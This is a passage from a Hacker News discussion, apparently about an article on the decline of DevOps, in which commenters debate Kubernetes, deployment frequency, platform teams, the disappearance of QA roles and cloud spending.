never broken always ready for promotion to prod. Plus a few broken dependencies means ‘yellow’ === impairment not unusable. If the app is unusable for any one dependency that is another issue. Mocking data when you are ahead of another team is always the reality… reply fragmede 6 hours agorootparent> Development should never be broken, ever. And devs should just not write bugs in their code, ever. Development mostly works, but is going to be broken in subtle ways that other teams are going to pull their hair out because their thing doesn't work, but their thing doesn't work because your team has broken development in a very subtle way that only that one team tickles. Your tests didn't catch it and the rest of your team didn't catch it during code review. reply Sn0wCoder 13 hours agorootparentprevJust want to add that these are all good points and good discussion. Ultimately, I think we agree that DeOps is needed no matter how it’s used. The details of how exactly it’s used per product, per team, per organization is always ‘it depends’. Some of us need to jump through more hoops and there is no way any of our products would be updated in production multiple times per day much less multiple times per month unless it was a hot fix of a critical bug. CI/CD is something to strive for as if you can release to develop multiple times per day it’s only the surrounding process that prevents you from releasing to production multiple times per day. reply signal11 14 hours agorootparentprevIt’s possible in many even heavily regulated domains, because there’s enough data now for regulators that it reduces risk. Releasing multiple times a day in itself isn’t the point though. The point is — adopting good practices to ensure trunk based development is pain-free. It’s about ensuring the release process is as automated as possible (if you’re releasing once a month, you are exercising your deployment process 12 times a year. When you’re exercising your deployment process 12 times a day, it really encourages you to work the kinks out.) It’s also ensuring that your monitoring and alerting can keep up. Essentially it’s a signal to the entire org that “We will move fast. Deal with it.” There’s data out there from even large non-FAANG orgs now about how this approach reduces sevs instead of increasing them. reply LudwigNagasena 17 hours agorootparentprev> Not sure where the idea that software is released to production multiple times per ever came from. UX-focused development. Your concern is mainly about user journeys, acquisition tunnels, etc. So you rely on user feedback a lot. So you ship, A/B test, iterate. Also, if your service consists of lots of microservices, you don’t want to wait to ship them all at the same time. The most fitting example to both is probably Netflix. I guess they ship to prod every day a lot. reply Sn0wCoder 17 hours agorootparentFair enough. Guess that is why Netfix is so Glitchy every other day j/k. I should have kept that last sentence out but I will not edit it now as I asked…. reply smusamashah 17 hours agoparentprevI bumped into a DevOps job at Teradata, did it for two years, then left for where I belong, in gaming as a backend developer. It was a corporate with good pays and perks including international travel etc. Some friends are still there doing DevOps very happily. Talking to them it never feels a like a dying field. I hated my DevOps role so pardon me for only reading the headings of the article, but talking about it in past sentences seemed very delusional. reply wokwokwok 14 hours agorootparentThe deep deep irony of hiring someone specifically to do \"devops\". That's not devops. Devops is when you have developers who are empowered. When you hire someone specifically to do devops you are hiring an ops team and calling it devops. So, yeah. That still happens, sure. However, I do think it's changing these days: linkedin > connections -> control-F -> 'devops' => 0 hits \"Site Reliability Engineer\" -> 10 hits I think hiring SRE makes sense. I think hiring 'platform engineers' makes sense. People still do that, and will, as far as I know, far into to the future. ...but I think hiring devops means you never understood, even vaguely, what devops was; you're just using a buzz word in your job ad. reply signal11 13 hours agorootparentThis. I see ads for DevOps roles as a signal that “this org doesn’t get it”. DevOps is about people and culture. Your teams embrace automation, fail fast, lean — all the good stuff. DevOps is about concrete business outcomes. Not Ansible or bazel. > hiring devops means you never understood, even vaguely, what devops was; you're just using a buzz word in your job ad. Yes! reply hparadiz 13 hours agorootparentI honestly don't get this thread and the complaining. Yes, I was one of those empowered engineers at an org that did ALL of the DevOps. But do ya'll seriously think you don't sometimes need people who do ONLY DevOps? Cause I can tell you there are absolutely orgs that deploy dozens, if not hundreds of servers sometimes by region and in those cases you absolutely do need full time DevOps engineers to tune, configure, and deploy these fleets. And yea it's a full time job just to do that. reply michaelmior 12 hours agorootparent> in those cases you absolutely do need full time DevOps engineers to tune, configure, and deploy these fleets At that point, it sounds like you're just doing ops work. reply sgarland 6 hours agorootparentCorrect, except generally they aren’t even good at ops. They tend to know a highly specific slice, or how to operate an abstraction. But troubleshooting Linux? Good luck. reply tkiolp4 8 hours agorootparentprev> Devops is when you have developers who are empowered. That’s just half true. If something doesn’t work in production, guess who can get mysql production logs? Not the developers. Can you access production dbs (not that that’s the way to fix things, but I have seen that in many orgs)? Nop. And if there’s anything you can do yourself (like changing things via TF files), you’ll need to wait until the gatekeepers approve your request. The gatekeeper are usually called platform engineers. But in any case, I don’t want all that power (and responsibility) either if it does not come with an increased compensation. reply austinshea 18 hours agoprevThis is entirely predicated on the issues this person experienced. Irrespective of whether or not devops teams end up with solutions that look like this, none of them are meant to. My first experiences had to do with the ability to add new services, monolith or not, and have their infrastructure be created/modified/removed in a environment/region in-specific way, and to be able to safely allow developers to self-service deploy as often as they want, with the expectation that there would be metrics available to observe the roll-out, and safely revert without manual intervention. If you can't do this stuff, then you can't have a serious posture on financial cost, while also providing redundancy, security, or operating independently of one cloud provider, or one specific region/datacenter. Not without a lot of old school, manual, systems administrator work. DevOps hasn't gone away, it has become the standard. A bunch of pet servers is not going to pass the appropriate audits. reply 8organicbits 18 hours agoparentAgreed, standardization has been hugely helpful. From the article: > adopt much more simple and easy-to-troubleshoot workflows like \"a bash script that pulls a new container\". This style of thinking let's developers learn every nitty gritty pain of why we have frameworks. I see the same challenge with static site generators, they are all kinda annoying so people write their own, but then theirs is even worse. reply osigurdson 18 hours agoprev>> abandon technology like Kubernetes I think a lot of Kubernetes hate is misplaced. It is a great piece of software engineering, well supported and runs everywhere. You certainly don't always need it but don't create a bunch of random bash scripts running all of the place instead of learning how to use it. reply weitendorf 17 hours agoparentIt's basically a prototype that industry ran away with. It leaks implementation details everywhere and pushes way too many config options up to the developer. Because industry ran away with it before it could be good, it takes projects like Cilium to push it in the right direction, but those take forever to get adopted and are really hard because they don't live in the product itself. You'd need like 10 more Ciliums to make Kubernetes actually good, and they'll never all get adopted. The tech is a dead end that demonstrates some nice tech/patterns but got overhyped. It's like the Hadoop of containers reply llama052 17 hours agorootparentCan you clarify what you mean by \"leaks implementation details everywhere\"? I like to think of kubernetes as a big orchestration platform that you can choose to use what you need. If an ingress and pods work then use that, otherwise extend an throw an operator up for what you need (it likely already exists). Cilium for instance is great for that, so is Istio and the like. They aren't hard you just have to understand networking... which is nearly the same energy of running it on another orchestration tool or raw on a network device. reply nunez 2 hours agorootparentJust look at the release notes for every major release. They focus on what's new within Kubernetes architecture instead of what's new that benefits users. Things like having to remove finalizers appended onto resources when you delete them and they hang. Damn near everything about Custom Resources. This isn't a dig at Kubernetes; I love using it. However, I agree that it leaks implementation everywhere. reply weitendorf 16 hours agorootparentprevYou shouldn’t have to think about all the implementation details of your deployment target. There shouldn’t be platform engineers or Kubernetes experts. Nobody should be writing YAML, or getting paid to set up Istio. Nobody should have to learn the Kubernetes architecture or know about the kubelet or EBPF. The tools should be simple enough with good defaults that application developers just click a button and have their code run somewhere. Right now platform engineers fill that gap, because the underlying tech doesn’t. IMO you are thinking too much like an engineer if you are saying you “just have to understand networking”. Why? It’s always better when the problem gets solved in a way that allows you to not think of it too much. Right now SREs and the platform team do that for application developers because Kubernetes only does it halfway. Infrastructure/devops/SRE is a pure means to an end of getting actual applications (the ultimate source of all the value in software) to run. It’s an obstacle. Right now the obstacle is bigger than it needs to be reply llama052 14 hours agorootparentSo there should be magic on every layer except for the application? That will never happen, the only thing you can do is pay someone like heroku to take care of that for you. Or if your project is small and plain enough you run “serverless” which is just routing to another platform team, as I’m sure you’re familiar. It’s complicated because there’s a lot that goes on, kubernetes or not. reply weitendorf 12 hours agorootparentYou literally use magic like that all the time with Linux, compilers, language runtimes. Magic is perfectly good when it works. Being able to do anything you want with a quick “presto” is amazing. Nobody should have to learn arcane spells, study the ancient tomes, and communicate with beings of the ethereal plane - somebody just needs to figure out the next “presto”. And historically speaking, usually somebody does when there’s an incentive to do so. In other words - Serverless is another platform team in the same way Linux is another OS team or Java is another language team. And for 99.9% of companies a language team or OS team would be absurd. There’s a big incentive for platform work to go the same way. reply stackskipton 15 hours agorootparentprevOps here, In a simple Kubernetes environment, you don't have to know networking. However, few environments are simple and abstracting X away becomes extremely difficult job once business requirements collide with abstraction. Obstacle is big most of time because most applications are not easy to run. Most DevOps mostly came around because Devs flinging balls of mud over the wall and landing on the Ops side with a splat and then screaming when we can't build nets to catch the mud ball and Ops is covered with mud. Sure it failed just like DevSecOps fails because most of time, Devs don't care about anything other than closing Jira tickets and going home. reply osigurdson 14 hours agorootparentI think that devs really should have a decent understanding of Kubernetes. It is essentially the operating system for any app that needs more than one computer. reply klooney 15 hours agorootparentprevYou don't need any of that, EKS works out of the box with Fargate. But companies don't want that, they want to support EKS and data centers, which means supporting the \"implementation\" side of all of the interfaces, which means getting down into the details. The real problem is that every platform team, deep down, wants to rewrite EKS and they often do, which I would describe as \"a giant money pit\". reply Whitespace 15 hours agorootparentprevIs it fair to say that you are in favor of Heroku, fly.io, ECS, etc? reply weitendorf 11 hours agorootparentI think those products are much better than k8s for many use cases, but I don’t think that anybody has really delivered the right thing in that space yet. reply sadops 17 hours agorootparentprevKubernetes is just a poor Linux clone with extra steps. Seriously, it has all the basic parts of an OS, just half-assed: the scheduler, the networking, the state management. We already had way better operating systems that can, you know, schedule workloads and talk to the network, and it didn't require gigabytes of YAML and string templating to make it happen. reply weitendorf 16 hours agorootparentYes. I actually wrote another top line comment about this which I deleted. Kubernetes is like someone decided to create a distributed Linux where you had to configure and learn about every part of the operating system. Linux proves it’s possible to provide simple “deep interfaces” to OS-class, hard problems. Most people in industry have never used Borg or something like it, and so think Kubernetes is like apex technology rather than a step backwards. And to most people working directly on tech like Linux/containers/low-level infra is something they don’t even consider doing because they subconsciously think it’s off limits. So to them Kubernetes is amazing rather than riddled with fixable problems. reply udev4096 13 hours agoparentprevWhoever has worked with bash scripts would know that relying on a bunch of bash scripts for your infrastructure is extremely naive. At the end of the day, Kubernetes is just a tool with complexities in place for companies with larger workloads reply physicles 17 hours agoparentprevAgreed. If we didn’t use kubernetes, we’d have to reimplement a bunch of its features. Back when we were getting started I tried docker swarm because it was supposed to be simpler, but I had weird issues with its networking. The best part is multiple environments. I can run our full stack on my laptop with k3s and one call to make. We use the same yaml (with kustomize) for all three cloud environments. It feels pretty boring, which is fantastic. reply weitendorf 16 hours agorootparentThe argument against Kubernetes is not that you should go backwards from it, but that there is a huge need for something better than it. Many big tech companies have platforms that are better than it which aren’t properly (if at all) externally productized. And the fact that many medium companies have “platform teams” configuring Kubernetes and gluing together basically the same set of tools (source, build, test, release, ops, obs) together in basically the same way is a huge smell that something better is needed. Basically, doing things the right way is actually a big operational/engineering/monetary burden for most companies that just want to write applications. And K8s is a big part of that reply stackskipton 16 hours agorootparentBig tech companies are willing to invest in those platforms and mold them to work like they want to work. Few other companies do so and Kubernetes becomes the way to get big tech like platform. I do agree it could be better but it's Un opinioned nature also let's these companies shape it in a way that matches where they are. Also, probably biggest issues with it only come up if you are not in managed Kubernetes which many are. reply zer00eyz 18 hours agoparentprevIts not. The whole ecosystem around it is an example of Conways law and and a Google product. None of the people using it are google. Google, also, runs its own hardware. Shockingly it is a great product if you rent hardware, autoscaling is autospending. No one knows what a feature costs any more because its all just a big bucket your pouring money into for amazon to have 30 percent margin on. We need operations people again, we need to stop using containers as bags for shitty \"software\" ... Do actual engineering. reply llama052 17 hours agorootparentKubernetes is actually extremely popular all around the world. Chickfila if I recall correctly deploy it in every single store! A lot of big dinosaur corporations are implementing it actively. Unfortunately VMs or Kubernetes or whatever tooling is still going to suck if you have shitty people using them. reply chris_wot 15 hours agorootparentVMs are going to suck if you use VMWare and they hike the price four fold. reply whoknowsidont 14 hours agorootparentprev>The whole ecosystem around it is an example of Conways law This is such an inaccurate take. >we need to stop using containers as bags Containers and container orchestration are a NEEDED and REQUIRED piece of the technology stack in the current reality. That doesn't mean people need to be ignorant of the details that make them work. As someone who's been around for a while we are in a better place than when we had \"dedicated operations people\" that just gatekept everything. What you hate are teams just parroting what other people are doing with the tech, not the tech itself. But let me tell you, if you're going to have teams of people pretend to know what they're doing wrapping it in a standard \"bag\" sure does make it a hell of a lot fucking easier to unfuck when things go wrong. reply bigstrat2003 48 minutes agorootparent> Containers and container orchestration are a NEEDED and REQUIRED piece of the technology stack in the current reality. That is not remotely true. Containers (and their orchestration) are a choice. Obviously people have their reasons for making that choice, but it is in no way a requirement. To say otherwise is either profound hyperbole or ignorance. reply zer00eyz 13 hours agorootparentprev> Containers and container orchestration are a NEEDED and REQUIRED piece of the technology stack in the current reality. If you're deploying NODEjs apps to the cloud, they sure are. > if you're going to have teams of people pretend to know what they're doing wrapping it in a standard \"bag\" sure does make it a hell of a lot fucking easier to unfuck when things go wrong. No one looks in the bag, they just roll back, the bag is opaque, the bag breeds more bags, less trnasparency and higher costs. Step back and read what you wrote, if you described any other relationship in your life in these terms, your friends would be having an intervention. The codependent circle jerk has enabled so much bad behavior. The tooling you're advocating for is an enabler. I want App Store like software roll outs. The infrastructure we have is kind of like that, if you don't look too close. We need to start doing the hard work to make it not suck. We need to stop pretending that this is a good place and put in the work to make it better. Otherwise its never going to get untucked... reply whoknowsidont 12 hours agorootparent>If you're deploying NODEjs apps to the cloud, they sure are. I don't use nodejs. >No one looks in the bag I sure have. Plenty of times. >if you described any other relationship in your life in these terms, your friends would be having an intervention. For having a standard tool that you know how to use? That doesn't seem correct and it certainly isn't proportional. >I want App Store like software roll outs. Okay it sounds like you want K8's. reply milkglass 17 hours agorootparentprevWhere's all the good operations people at nowadays? Have worked with numerous cloud native engineers that do not have good foundational knowledge. reply Aeolun 17 hours agorootparent> Where's all the good operations people at nowadays? Still in the same place they were 20 years ago. They’ve just been lost in the swamp of their peers that know nothing. reply betaby 17 hours agorootparentprev> cloud native engineers That's the problem. Yes, I'm the old man yelling at cloud, but indeed 'kids this days' don't know Linux, they know how to provision things from Terraform. In fact it feels like logging in via ssh and checking process with with `strace` is a lost art. Checking PCAP? That's a black magic! reply aliasxneo 17 hours agorootparentI think this comment is a bit unfair. A lot of work goes into not having to do those things. Good immutability often means less need for babying a specific server. It’s been a long time since I’ve had to do those things, so yes it’s becoming a lost art to me. However, on the rare occasion I need this sort of insight I do fine with JIT research. reply sgarland 6 hours agorootparentprevIt’s the logical outcome for most when you don’t grow up being told to RTFM, you’ve never had to recompile a kernel to get an expansion card to work, and you’ve never touched hardware. reply sadops 17 hours agorootparentprevThis is the elephant in the room: all \"new\" technology isn't fundamentally new. Terraform is just curl with state management for lots of different websites, Andible is just a YAML to Bash converter, and so on. If you have good fundamentals, not only are these things easy, they're also incredibly frustrating, because you can easily see their limitations. You can always tell how experienced someone is by how well they know what a given tool is actually doing under the hood. People who exhibit shock and awe will just mess up your codebase, because they have no clue how the machine actually works. No, I want to hire the grumpy, cynical greybeards, because they know their fundamentals, and they're immune to shiny bullshit. There's no substitute for skill and experience, despite what the modern tech discourse says. \"Anyone can program!\" And yet, we have threads like this, where we find out, SHOCKER, that the best codebases are the ones maintained by like... four senior developers, half of whom contributed to several Internet RFCs, and half of whom used to work at Bell Labs. I feel like we are through the looking glass. reply sgarland 6 hours agorootparent> There's no substitute for skill and experience, despite what the modern tech discourse says. \"Anyone can program!\" I’m told this is gatekeeping. Yes, and…? I’ve always found it amusing that I see little to no anger being directed at kernel devs for their gatekeeping. Almost as if deep down, people know that they shouldn’t be fucking with the thing that runs the world unless they are actually good at it. Or maybe they’re just afraid of Torvalds. reply bigstrat2003 34 minutes agorootparentI agree that \"gatekeeping\" gets a bad rap. Sure, it can be taken too far. But at the end of the day, one needs to actually be qualified. And if they aren't, well sorry but you aren't good enough for the job. It doesn't make you a bad person, it just means you need to work on your skills before you're a fit. reply udev4096 13 hours agorootparentprevAnsible is a lot more than just \"YAML to Bash\". For instance, Bash scripts are not idempotent. Ansible playbooks are. Sure, you can hack together a way to ssh and run commands very easily but it will break at some point reply bigstrat2003 41 minutes agorootparentBash scripts are as idempotent as you want to make them, so I think the comparison holds. reply p_l 7 hours agorootparentprevAnsible playbooks are as idempotent as bash scripts. You need to include checks when writing them so they actually are idempotent, just like with bash script, and they happily leak idempotency-breaking details like \"restarting a service\" works only if a) service currently runs b) because \"restart\" is a command, not expected state of \"the service was restarted and is now running reply llama052 17 hours agorootparentprevI think that's the issue, it's not the tooling. Kubernetes is great... unfortunately people are awful at unpacking the underlying layers. reply 28304283409234 3 hours agoparentprevMany things are 'great pieces of [software] engineering'. That does not mean they are a fit solution to any problem. Many times a script or simple ansible playbook, or docker-compose is just a better fit. reply The_Colonel 9 hours agoprev> The cause of its death was a critical misunderstanding over what was causing software to be hard to write. The belief was by removing barriers to deployment, more software would get deployed and things would be easier and better. Effectively that the issue was that developers and operations teams were being held back by ridiculous process and coordination. So many arguments are based on strawmen... I like devops / daily deploys, because they're part of the puzzle leading to higher quality code being deployed on production, and associated less stress. The point is (for any individual developer) not to actually deploy their progress every day on prod, but to have the option to do so. This leads to code going on prod when it's ready, but no sooner. If the problem is more difficult than anticipated, code still sucks and needs refactoring, well, you're just going to work on it as long as it needs it and deploy it only then. Meanwhile if you have let's say monthly releases, you will get the death marches, because delay of one day can mean delay of one month / quarter / whatever. Everyone feels the pressure to deliver, leading to suboptimal choices, bad code being approved etc. reply ozim 9 hours agoprevI think author is just wrong. I see it has a lot of upvotes so there are people who share view with author. But every single idea I read in that post is just wrong. Like author never worked in siloed team where you had to wait blocked for a week so DBA guy picks up your change request. Then if something went wrong on prod you had to wait for SysAdmin to basically be your typist because you did not have access right. It is not that you don’t need DBA or SysAdmin but for devops purpose they are assigned to a team - which makes companies needing more of those people NOT LESS - because earlier you had single DBA to know all of company projects which was cheaper for business. Now idea is you have people in the teams so you don’t throw stuff over the wall but single team can deploy and operate their project with full knowledge. Well of course there are companies that take 5 jr devs and now assign them to be devops team but that is company work organization problem not devops problem. reply johnny22 1 hour agoparentthe author is talking about how things got perhaps overcorrected, not that something shouldn't be done about problems you're talking about. reply photonthug 17 hours agoprev2 observations, first the cynical one, but the second is optimistic. For leadership, the whole idea of \"breaking down silos\" is almost always lip-service, and to the extent that is/was a core mission of DevOps, it was always doomed. Responsibility without power doesn't work, so it's pointless unless the very top wants to see it happen. Strong CTOs with vision are pretty rare, and the reality is that the next tier of department heads from QA/Engineering/DataScience/Product are very often rivals for budgets and attention. People that get to this level of management usually love building kingdoms, and see most things as zero-sum, so they are careful to never appear actually uncooperative but they also don't really want collaboration. Collaboration effectively increases accountability and spreads out power. If you're in the business of breaking down silos, almost everyone will be trying undermine you as soon as they think you're threatening them with any kind of oversight, regardless of how badly they know that they need process changes. Anyway, the best devops people are usually excited to code themselves out of a job. To a large extent.. that's what has happened. We're out of the research phase of looking for approaches that work. For any specific problem in this domain we've mostly got tools that work well and scale well. The tools are documented, mature, and most even permit for a healthy choice amongst alternatives. The landscape of this tooling is generally hospitable, not what you'd call a desert or a jungle, and it's not as much of a moving target to learn the tech involved as it used to be. Not saying every dev needs to be a Kubernetes admin.. but a dev refusing to learn anything about kubernetes in 2024 is starting to look more like a developer that doesn't know Linux command line basics. Beyond the basics, Platform teams are fine.. they are just the subset of people with previous DevOps titles that can actually write code, further weeding out the old-school DBAs / Sysadmins, bolstered by a few even stronger coders that are good with cloud APIs but don't understand ELBs / VPCs. reply dissent 15 hours agoprevI have long felt that DevOps was always a philosophy, not a methodology. It simply meant folding all that operations stuff into the SDLC. It was always about making Ops part of Dev, not the other way around, and especially not as a standalone discipline. The cloud made this a lot easier, as everything could be done programmatically, but the philosophy held true long before that. It doesn't mean CI/CD pipelines, Terraform, or YAML. Those are all incidental. The moment specialised \"DevOps\" teams started springing up it was all over. We just reinvented the sysadmin. reply osigurdson 18 hours agoprev>> The User is the Tester If you can afford to make the user the tester, you should. There is no moral hazard, only an economic one. If you have 5 million customers paying $1 / year, make the user do the testing via canary deployments, metrics, etc. If you have 5 customers each paying $1M / year, be sure to test it yourself. The problem seems to be that people forget which regime they are operating in. reply chefandy 17 hours agoparent> There is no moral hazard, only an economic one. Er... No? If you take someone's money in exchange for goods and services, you have a moral duty to give them what you said you would. Not a broken version of it– what they bought. If you explicitly state they're getting an unstable product, then sure. If you actually do your best within reason and your service is broken, shit happens. Nobody is perfect, but you made a good faith effort to deliver on your promise. But if you don't, and deliberately don't bother checking if it actually works while happily pocketing people's cash, that's unambiguously negligent. Ripping off small groups of customers is no morally different than ripping off all of your customers— it's the same immorality at a smaller scale so you're more likely to get away with it. reply osigurdson 17 hours agorootparentIs your argument than an amount of money approaching zero in the limit is morally distinct from zero - triggering a step change in behavior? reply chefandy 17 hours agorootparentI should have known better then to take that bait. I'm not interested in pedantic philosophical debate about theoretical obligations skewed by imaginary prices that don't reflect real world business scenarios. In fact, I'm opting out of this entirely. Have a good night. reply sadops 17 hours agorootparentprevI think you know what they're arguing. It couldn't be clearer. reply osigurdson 16 hours agorootparentI'd like them to be clear about their own thinking. Something occurs in their mind once money is exchanged. If time is exchanged (i.e. advertising), on the other hand, no such pact is created. Why? Isn't money essentially a proxy for time? reply mcmcmc 15 hours agorootparentAbsolutely not. Quit the bad faith arguments please reply ianbutler 18 hours agoprevThe successor, the platform team, is also really only accessible to enterprise companies. Hiring an entire team to build great dev-tooling and deployments, monitoring, application templates, org level dependency management etc is just too much to swallow for any medium sized or smaller business, so in that reality you wind up with a few heavily overworked devops folks who take up unhealthy habits to cope with the associated stress and risk. In my 10 year career thus far none of the startups I worked for, even well capitalized ones had what this article, and myself, would consider to be a platform team. I only saw my first platform team when I stepped into a role at 6000+ person company. It's effectively an underserved (and under-appreciated imo) area and responsible for a lot of pain and land-mine decisions companies make around their software product. reply nubinetwork 12 hours agoprevThe problem with devops was that companies thought they could get away with training a dev to run a server farm (or training a sysadmin to code)... while it might have worked for some companies, it just smacked of being cheap everywhere else. I still see similar job postings online under the guise of \"engineer\". reply jascha_eng 18 hours agoprevJust like agile, DevOps has some good intentions. It's always about how it's executed and like anything in software engineering you will run into trade off situations where you have to find the best solution for your organization and product. I really enjoy working in a deploy often and fast environment though and I firmly believe that fast feedback loops are one of the most important things for development speed. And this is what DevOps at its heart is about. How you achieve this and how reasonable it is for your situation is left for you to decide. reply rednafi 6 hours agoprevThe funny thing is, when ZIRP ended, people realized that the original dev / ops separation was actually better & regressed back to it with an armada of new tools and acronyms. reply jillesvangurp 11 hours agoprevI remember dealing with ops teams. Nice people but it added a lot of delays and friction to deploying things. I very much prefer not having to deal with ops departments today. Not a thing in my life anymore. In that sense the devops movement has been a total success. Where devops went wrong in a lot of teams though is assuming it's a full time role for a specialist that then does your devops. That's not devops. It's ops. And these aren't developers but operations people. Embedding them in teams is still progress though as it removes obstacles. But if you do it right, this is not a full time thing at all. The wrong way is generating a lot of busywork for your devops people to develop loads of yaml files that feed into things like Kubernetes, Terraform and then enable organizations to codify their structure into their deployment architecture using microservices (Conway's law). I'd suggest not doing that and doing things that minimize the need for devops people. Like using monoliths. I prefer solutions that minimize my time involvement. I use monoliths so I don't have to babysit a gazillion deployment scripts. I need just one of those. And since I don't have micro services, I use docker compose, not Kubernetes. The deployment script is just a few lines of bash that restarts docker compose. It kicks in with a simple Github action. The amount of time setting that up is a few hours at best. I rarely need to touch those files. We have no Terraform because our production environment got created manually and we're not in the habit of destroying and recreating that a lot since we launched it years ago. And it's simple enough that I can click a new one together in an hour or so. Automating one off things like that has very low value to me. reply clvx 18 hours agoprevOne item the DevOps mindset missed was reproducibility. Fast feedback loops in spirit tell to have a way to know what’s wrong but it doesn’t tell how to reproduce it as you have layers and layers where your code is run. So, you are in a spot of I kinda know what’s going on but I have no way to reproduce it because: - the application has hardcoded paths. - the service discovery isn’t dynamic - the branching strategy doesn’t account for edge cases. - the build process doesn’t account for edge cases. - and many other things that are related to bad practices. I recall an old boss saying he wanted stable dev environments which sounded an oximoron. I’ve always aimed to have an environment where I can reproduce a desired behavior wether is a faulty or not. reply physicles 17 hours agoparentReproducibility is one of the things we got with containers and k8s (and before that, 12-factor apps). I run k3s on my laptop with a minified stack, which is good enough to mimic nearly any behavior on prod. Cloud-specific saas (like proprietary databases and AWS lambda) are awful for this though, and we avoid them where possible. Our S3 code was a bug farm until I discovered minio. Now we’re stuck with Snowflake because scale and speed, but the fact that I can’t iterate fast locally has caused me to lose days of my life that I’ll never get back. Hoping I can hack something together with duckdb when I get time. reply agentultra 18 hours agoprevDidn't help that we had made these components and services into commodities. Developers and organizations came to expect them. Of course you use CI/CD pipelines to build and deploy your software. Of course you use orchestration and autoscaling groups. And so on. So that even if you're building small website for your local soccer club it's probably run through GHA on every change with a full red/green deploy process, run on autoscaling groups and so on. Never mind that most of these applications' databases could fit into RAM on a single server with 24 cores and never even touch the system limits. reply treis 17 hours agoparentThis is one of those things that still makes me scratch my head. When I started programming my code ran on a 2-4 thread machine with a couple GB of ram because that was the size of a relatively affordable commodity server. Today my code runs on a 2-4 thread pod with a couple GB of ram because... reasons I guess. The industry has been given servers with 100x the resources and collectively said \"naw I'm good\". Can't wrap my head around it. reply mgarfias 12 hours agoprevAnd stop incentivizing “innovation”. Reward people that simplify things so it’s easy to fix at 2am. reply zer00eyz 19 hours agoprev> Money was (effectively) free so it was better to increase speed regardless of monthly bills. Jesus this. No one knows where the money goes. If you can't tell me cost per customer, per user then your business is missing key metrics. > ... \"discovered\" that troubleshooting Kubernetes was a bit like Warhammer 40k Adeptus Mechanicus waving incense in front of machines they didn't understand in the hopes that it would make the problem go away. Wackamole with problems... The part where he talks about the death of QA.. yea. This is enshitifcation in action. reply TranquilMarmot 18 hours agoparentI _really_ miss having a dedicated QA team / process. I noticed that the role essentially disappeared a few years back, and now developers and users have to be the ones asking \"is this working the way it should be?\" reply sadops 17 hours agorootparentPouring out for QA over here. My first gig ever, we had lovely QA people who spent all day just... using the application and trying to make it break. When it did, they'd fail tickets back to us, and we'd fix them. It worked so amazingly well. Now? Hurried, bored devs do it to get the next release out the door, and it shows. reply eddythompson80 17 hours agorootparentI worked in QA for the first 4 years of my career. There was a lot of creativity in “how to make an application/feature break”. Sure, most of the time I didn’t realize that 10 scenarios I would run through were moot because of how a feature was implemented. But often, that “creativity” would expose major issues that I had no idea about their root cause, but would drive significant (or important) changes to the product. One of my favorites in my first couple of months in my career was testing a service that accepted user uploads and returned some value based on the upload. I thought “oh, I should just test a butt-load of invalid files”. Where am I gonna get a butt-load of invalid files for our service? I’ll just write a script that iterates and uploads everything under my `C:\\Windows` folder. Discovered 2 bugs. One was that some random binary files there caused the parser the service was using to segfault and another about how the service stored those temp files before validating them. The first required involvement from a totally different team in the company because of “how serious it was”. As a fresh college hire at the time I got a ton of praise for “exposing such a critical buffer overflow” that went undetected for years (lol, I had no idea what I was doing but I took the praise). The latter was because the developer of the service never cleared their /tmp directory where they wrote user uploads before validating them. I ended up filling the VM disk with junk that took down the entire service. reply eddythompson80 17 hours agorootparentprevMe too. Oh man, me too. Often times, the good QA people/teams were the ones who knew how a feature fully worked. It’s limitations, extensibility, interoperability with other features, etc. In the beginning of the transition/disappearnce of QA developers were told they needed to be their own QA. And this made some sense assuming the dev would be given 2x the time for each feature. But that expectation quickly changed to build an MVP, give a demo, ship it to “get feedback from users”. reply photonthug 18 hours agorootparentprevThis is under appreciated. What happens is that product managers are either crippled with the fallout from double duty, or, they go mad with power at the extra clout they are given to try to compensate for the nonsense position that orgs find themselves in. Both are ugly situations, and either way we lost important checks and balances. Putting anyone else in charge of quality turns into self reporting and always has a conflict of interest reply eddythompson80 17 hours agorootparentOr what happened in my company where product managers were expected to take on a marketing role, and developers were the ones left with 3 roles or product management (usually left to the dev manager), development and QA on the individual developer. You’re left with product managers have no clue how the product works. They meet with 3-8 customers or other teams a day, and come back with a check-list of “must haves”. They have no idea how the existing product works, they just know that “customer is asking for X, what’s the timeframe for adding X?”. Then dev managers who have to take product management role, so they have no time for understanding how anything is actually built. Their time is spent defining timeframes, requirements, and expectations with other teams. “We trust our developers to do the right implementation”. Then developers who just get piecemeal requirements and are asked to implement it in the simplest fastest way. No time for a major redesign or refactoring of anything. Because from the PM prospective, there is a check-list of items we need and there are 2 unchecked boxes. From the dev manager prospective, we have X and Y, so having XY makes sense. Then from the developer prospective, just duct-tape them together instead of actually building Z which is what makes sense. reply Spartan-S63 18 hours agoparentprev> > Money was (effectively) free so it was better to increase speed regardless of monthly bills. > Jesus this. No one knows where the money goes. If you can't tell me cost per customer, per user then your business is missing key metrics. This is where something like FinOps comes into play as a framework to adapt to your needs. reply adolph 18 hours agorootparentYes, some K8s operators to cost your deployments so you can auto scale based on ROI of a microservice instead of raw utilization. No point in spending on five nines if nobody will even pay for two. It’s all straight out of “programmers are also human” https://youtu.be/aWfYxg-Ypm4 reply osigurdson 18 hours agoparentprev>> \"discovered\" that troubleshooting Kubernetes was a bit like Warhammer 40k Adeptus Mechanicus waving incense in front of machines they didn't understand in the hopes that it would make the problem go away I'm not familiar with the reference but logs, events and metrics seem pretty useful. Port forward, shell into containers, view logs, etc. I don't see what is so bad about it. reply zer00eyz 13 hours agorootparent> shell into containers The problem here is that once your in and need tooling what do you do? Your likely going to have to re-build the whole container with that tooling on board (if its even possible)... Containers aren't problematic in themselves. There are reasons to use them. Ruby, php, JS python (fucking venvs) have this habit of contaminating a system. Containers are a great way of... containing that shit. But the moment I'm giving you a single file binary.. why in the name of all that is holy are you putting it in a container? If it's untrusted software then there is a good reason but then why are you running it at all? And that's the thing. Depending on what I ask you to do there are places where your not going to say \"let me put this in a container\" ... Most of that is \"good software\" and \"performant\" ... Its a statement about everything that comes in that \"container\" reply osigurdson 5 hours agorootparentEven with a single file binary, there are still reasons to put it in a container. You could do some similar things (e.g. resource limits) messing with cgroups manually, but why? So much tooling has been built up around containers that not using them often means re-inventing things that are already done. Of course, if you have one file (or many) that you run on one server and downtime is ok during updates then fine to just do everything manually. You could even keep the code on that server as well. ssh in, edit compile and run your production app directly from the out directory. Basically run production on your dev machine. It sounds pretty silly / \"non professional\", but there are times where ultra low cycle times outweigh other things (like when you have one developer and desperately trying to win your first customer - you know \"do things that don't scale\"). The main thing is, you need to know the trade-offs you are making. reply osigurdson 4 hours agorootparentprevIf you need a container to be mutable for a while, you can. Mount an NFS volume and run from there. You can even checkout 